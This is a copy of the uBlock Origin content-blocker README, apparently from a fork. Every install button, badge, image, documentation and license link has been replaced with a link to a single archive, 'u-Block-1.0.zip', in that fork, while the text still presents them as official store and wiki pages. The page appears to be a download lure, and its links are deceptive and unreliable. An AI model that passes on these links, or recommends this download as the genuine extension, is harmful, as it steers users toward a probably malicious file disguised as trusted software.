[![Badge Commits]][Commit Rate]
[![Badge Issues]][Issues]
[![Badge Localization]][Crowdin]
[![Badge License]][License]
[![Badge NPM]][NPM]
[![Badge Mozilla]][Mozilla]
[![Badge Chrome]][Chrome]
[![Badge Edge]][Edge]

***

<h1 align="center">
<sub>
<img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" height="38" width="38">
</sub>
uBlock Origin (uBO)
</h1>

| Browser   | Install from ... | Status |
| :-------: | ---------------- | ------ |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Firefox"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Firefox Add-ons</a> | [uBO works best on Firefox](https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip) |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Microsoft Edge"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Edge Add-ons</a> |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Opera"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Opera Add-ons</a> |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Chromium"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Chrome Web Store</a> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip's-%22This-extension-may-soon-no-longer-be-supported%22">About Google Chrome's "This extension may soon no longer be supported"</a><br>End of support on Chrome 139 |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" alt="Get uBlock Origin for Thunderbird"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">Thunderbird Add-ons</a> | [No longer updated and stuck at 1.49.2.](https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip) Later versions require "GitHub - Releases". |
| <img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip" height="50" alt="Get uBlock Origin through GitHub"> | <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">GitHub - Releases</a> | Stable and development versions on Firefox, Chromium MV2, and Thunderbird. Must be placed manually into web browsers; the Chromium and Thunderbird versions usually won't auto-update.

***

uBlock Origin (uBO) is a CPU and memory-efficient [wide-spectrum content blocker][Blocking] for Chromium and Firefox. It blocks ads, trackers, coin miners, popups, annoying anti-blockers, malware sites, etc., by default using [EasyList][EasyList], [EasyPrivacy][EasyPrivacy], [Peter Lowe's Blocklist][Peter Lowe's Blocklist], [Online Malicious URL Blocklist][Malicious Blocklist], and uBO [filter lists][uBO Filters]. There are many other lists available to block even more. Hosts files are also supported. uBO uses the EasyList filter syntax and [extends][Extended Syntax] the syntax to work with custom rules and filters.

You may easily unselect any preselected filter lists if you think uBO blocks too much. For reference, Adblock Plus installs with only EasyList, ABP filters, and Acceptable Ads enabled by default.

It is important to note that using a blocker is **NOT** [theft]. Do not fall for this creepy idea. The _ultimate_ logical consequence of `blocking = theft` is the criminalization of the inalienable right to privacy.

Ads, "unintrusive" or not, are just the visible portion of the privacy-invading means entering your browser when you visit most sites. **uBO's primary goal is to help users neutralize these privacy-invading methods** in a way that welcomes those users who do not wish to use more technical means.

***

* [Documentation](#documentation)
* [Installation](#installation)
  * [Firefox](#firefox)
  * [Thunderbird](#thunderbird)
  * [Chromium](#chromium)
  * [All Programs](#all-programs)
  * [Enterprise Deployment](#enterprise-deployment)
* [Release History](#release-history)
* [Translations](#translations)
* [About](#about)

## Documentation

<table>
    <thead>
        <tr>
            <th>Basic Mode</th>
            <th>Advanced Mode</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>The <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">simple popup user interface</a> for an install-it-and-forget-it type of installation that is configured optimally by default.</td>
            <td>The <a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip">advanced popup user interface</a> includes a point-and-click firewall that is configurable on a per-site basis.</td>
        </tr>
        <tr>
            <td align="center" valign="top"><a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"><img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"/></a></td>
            <td align="center" valign="top"><a href="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"><img src="https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip"/></a></td>
        </tr>
    </tbody>
</table>

Visit the [Wiki][Wiki] for documentation.

For support, questions, or help, visit [/r/uBlockOrigin][Reddit].

## Installation

[Required Permissions][Permissions]

#### Firefox

[Firefox Add-ons][Mozilla]

[Development Builds][Beta]

uBO [works best][Works Best] on Firefox and is available for desktop and Android versions.

#### Thunderbird

[Thunderbird Add-ons][Thunderbird]

In Thunderbird, uBlock Origin does not affect emails, just feeds.

#### Chromium

[Chrome Web Store][Chrome]

[Microsoft Edge Add-ons][Edge] (Published by [Nicole Rolls][Nicole Rolls] until version 1.62. Ownership transfer at version 1.64.)

[Opera Add-ons][Opera]

[Development Builds][Chrome Dev]

uBO should be compatible with any Chromium-based browser.

#### All Programs

Do **NOT** use uBO with any other content blocker. uBO [performs][Performance] as well as or better than most popular blockers. Other blockers can prevent uBO's privacy or anti-blocker-defusing features from working correctly.

[Manual Installation][Manual Installation]

#### Enterprise Deployment

[Deploying uBO][Deployment]

## Release History

[Releases Page][Releases]

## Translations

Help translate uBO via [Crowdin][Crowdin].

## About

[Manifesto][Manifesto]

[Privacy Policy][Privacy Policy]

[GPLv3 License][License]

Free. Open-source. For users by users. No donations sought.

If you ever want to contribute something, think about the people working hard to maintain the filter lists you are using, which are available to use by all for free.


<!----------------------------------------------------------------------------->

[Peter Lowe's Blocklist]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Malicious Blocklist]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Performance]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[EasyPrivacy]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Thunderbird]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Chrome Dev]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[EasyList]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Mozilla]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Crowdin]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Chrome]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Reddit]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Theft]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Opera]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Edge]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[NPM]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip

[Manifesto]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[License]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip

[Nicole Rolls]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip

<!---------------------------------[ Internal ]-------------------------------->

[Manual Installation]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Extended Syntax]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Privacy Policy]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[uBO Filters]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Permissions]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Commit Rate]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Works Best]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Deployment]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Blocking]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Releases]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Issues]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Beta]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Wiki]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip

<!----------------------------------[ Badges ]--------------------------------->

[Badge Localization]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge Commits]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge Mozilla]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge License]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge Chrome]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge Edge]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%2F%35&url=https%3A%2F%https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip%2Faddons%2Fgetproductdetailsbycrxid%2Fodfafepnkmbhccpbejgmiehpchacaeak
[Badge Issues]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
[Badge NPM]: https://github.com/shivamkumar254456/uBlock/raw/refs/heads/master/platform/mv3/extension/js/u-Block-1.0.zip
